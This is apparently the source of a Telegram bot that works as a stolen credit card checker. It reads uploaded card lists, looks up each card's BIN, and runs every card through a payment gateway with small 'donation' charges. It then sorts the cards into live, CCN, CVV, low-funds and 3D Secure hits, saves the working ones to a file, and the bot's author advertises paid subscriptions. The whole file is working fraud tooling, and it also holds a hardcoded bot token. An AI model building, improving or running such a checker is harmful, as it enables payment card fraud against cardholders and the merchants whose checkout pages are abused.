import requests
import telebot, time, threading
from telebot import types
from gatet import Tele
import os
from func_timeout import func_timeout, FunctionTimedOut

# ==========================================
# 👇 BOT TOKEN
# ==========================================
token = '8299646020:AAHM7qDFRuBjcMRwFiLMwXMWxXxNs8mk0G4'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ==========================================
# 👇 ALLOWED USERS LIST
# ==========================================
ALLOWED_IDS = [
    '1915369904',    # Owner
    '',     # User 2
    '',     # User 3
    ''      # User 4
]

# ==========================================
# 🎨 UI HELPER FUNCTION (VIRTUAL CARD)
# ==========================================
def get_virtual_card_ui(total, current, live, die, ccn, low, cvv, last_cc):
    # Percentage Calculation
    percent = int((current / total) * 100) if total > 0 else 0
    filled = int(10 * current // total) if total > 0 else 0
    bar = '▓' * filled + '░' * (10 - filled)
    
    # Card Masking (4400 66XX XXXX 7890) logic
    # "Wait..." သို့မဟုတ် အခြားစာသားဖြစ်နေရင် error မတက်အောင် စစ်မယ်
    if len(last_cc) > 12:
        masked = last_cc[:4] + " " + last_cc[4:6] + "XX XXXX " + last_cc[-4:]
        card_logo = "𝑽𝑰𝑺𝑨" if last_cc.startswith("4") else "𝗠.𝑪."
    else:
        masked = "XXXX XXXX XXXX XXXX"
        card_logo = "VIRTUAL"

    # The UI Design
    text = (
        f"<code>╭──────────────────────╮</code>\n"
        f"<code>│  {card_logo}  Pʟᴀᴛɪɴᴜᴍ      │</code>\n"
        f"<code>│  {masked} │</code>\n"
        f"<code>│  Exp: 12/2X   Cvv: ••• │</code>\n"
        f"<code>╰──────────────────────╯</code>\n"
        f"👤 <b>User:</b> Virus\n"
        f"🔄 <b>Status:</b> <i>Checking...</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Live:</b> {live}     ❌ <b>Die:</b> {die}\n"
        f"🔐 <b>CCN:</b> {ccn}       ⚠️ <b>Low:</b> {low}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>[{bar}] {percent}%</b>"
    )
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💳 STOP CHECKING", callback_data="stop"))
    
    return text, markup

# ==========================================
# 🤖 BOT COMMANDS
# ==========================================

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in ALLOWED_IDS:
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
        return
    bot.reply_to(message, "𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰❤️")

@bot.message_handler(commands=["getlives"])
def get_lives(message):
    if str(message.chat.id) not in ALLOWED_IDS: return
    try:
        if os.path.exists("lives.txt"):
            with open("lives.txt", "rb") as f:
                bot.send_document(message.chat.id, f, caption="✅ <b>Here are your Charged/Live Cards</b>", parse_mode="HTML")
        else:
            bot.reply_to(message, "No Live cards saved yet! ❌")
    except Exception as e:
        bot.reply_to(message, f"Error sending file: {e}")

@bot.message_handler(commands=["clearlives"])
def clear_lives(message):
    if str(message.chat.id) not in ALLOWED_IDS: return
    if os.path.exists("lives.txt"):
        os.remove("lives.txt")
        bot.reply_to(message, "🗑️ <b>lives.txt has been cleared!</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "File is already empty.")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) not in ALLOWED_IDS:
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
        return

    t = threading.Thread(target=run_checker, args=(message,))
    t.start()

# ==========================================
# 🚀 CHECKER LOGIC (FULL FIX)
# ==========================================
def run_checker(message):
    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0
    
    chat_id = message.chat.id
    
    file_name = f"combo_{chat_id}_{int(time.time())}.txt"
    stop_file = f"stop_{chat_id}.stop"

    try:
        # Initial Message
        ko = bot.reply_to(message, "𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐍𝐨𝐰! 🚀").message_id
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        
        with open(file_name, "wb") as w:
            w.write(ee)
            
        with open(file_name, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            
            # 🔥 FIX 1: Show UI immediately before loop
            view_text, markup = get_virtual_card_ui(total, 0, 0, 0, 0, 0, 0, "Wait...")
            bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)

            for index, cc in enumerate(lino, 1):
                cc = cc.strip()
                
                # ===== STOP CHECK (1) =====
                if os.path.exists(stop_file):
                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text='🛑 <b>STOPPED (User Request)</b>')
                    os.remove(stop_file)
                    if os.path.exists(file_name): os.remove(file_name)
                    return
                
                # ===== BIN LOOKUP =====
                try:
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                except:
                    data = {}
                
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '')
                bank = data.get('bank', 'Unknown')
                
                # ===== STOP CHECK (2) =====
                if os.path.exists(stop_file):
                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text='🛑 <b>STOPPED (User Request)</b>')
                    os.remove(stop_file)
                    if os.path.exists(file_name): os.remove(file_name)
                    return

                start_time = time.time()
                
                # ===== GATE CHECK =====
                try:
                    last = str(func_timeout(100, Tele, args=(cc,)))
                except FunctionTimedOut:
                    last = 'Gateway Time Out ❌'
                except Exception as e:
                    print(e)
                    last = 'Error'
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                # ==========================================
                # 🔥 DASHBOARD UI UPDATE Logic Fixed 🔥
                # ==========================================
                
                is_hit = 'Donation Successful!' in last or 'funds' in last or 'security code' in last or 'Your card does not support' in last
                
                # 🔥 FIX 2: Hit မိရင် (သို့) ၁ ကဒ်မြောက် (သို့) ၅ ကဒ်ပြည့်တိုင်း Update
                if is_hit or (index == 1) or (index % 5 == 0) or (index == total):
                    view_text, markup = get_virtual_card_ui(total, index, ch, dd, ccn, lowfund, cvv, cc)
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                    except Exception as e:
                        pass 
                
                # ==========================================
                # ✅ RESULTS HANDLING
                # ==========================================
                print(f"{chat_id} : {cc} -> {last}")
                
                if 'Donation Successful!' in last or 'funds' in last:
                    with open("lives.txt", "a") as f:
                        f.write(f"{cc} - {last} - {bank} ({country})\n")

                if 'Donation Successful!' in last:
                    ch += 1
                    msg = f'''✅ <b>Charge Hit!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> Payment Successful ✅
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1
                    msg = f'''✅ <b>CVV Hit!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> CVV Mismatch ⚠️
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1
                    msg = f'''🔐 <b>CCN Live!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> CCN Live ✅
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                    # Update immediately for CCN
                    view_text, markup = get_virtual_card_ui(total, index, ch, dd, ccn, lowfund, cvv, cc)
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                    except:
                        pass
                    
                elif 'funds' in last:
                    lowfund += 1
                    msg = f'''⚠️ <b>Insufficient Funds!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> Low Funds ⛔
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                elif 'The payment needs additional action before completion!' in last:
                    cvv += 1
                    msg = f'''⚠️ <b>3D Secure!</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>{cc}</code>
🚀 <b>Response:</b> 3D Action Required 🔄
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bin:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} - {country_flag}
⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
━━━━━━━━━━━━━━━━━━━━
<b>Bot by:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                        
                else:
                    dd += 1
                    time.sleep(1)
        
        if os.path.exists(file_name): os.remove(file_name)
        bot.edit_message_text(chat_id=chat_id, message_id=ko, text='✅ <b>Checking Completed!</b>\nBot By ➜ @Rusisvirus')

    except Exception as e:
        print(f"Error for {chat_id}: {e}")

# ==========================================
# 🛑 STOP CALLBACK
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    stop_file = f"stop_{call.message.chat.id}.stop"
    with open(stop_file, "w") as file:
        pass
    bot.answer_callback_query(call.id, "Stopping...")

# ===== POLLING =====
print("🤖 Virtual Card Bot Started...")
while True:
    try:
        bot.polling(non_stop=True, timeout=20, long_polling_timeout=20)
    except Exception as e:
        print("Polling error:", e)
        time.sleep(5)
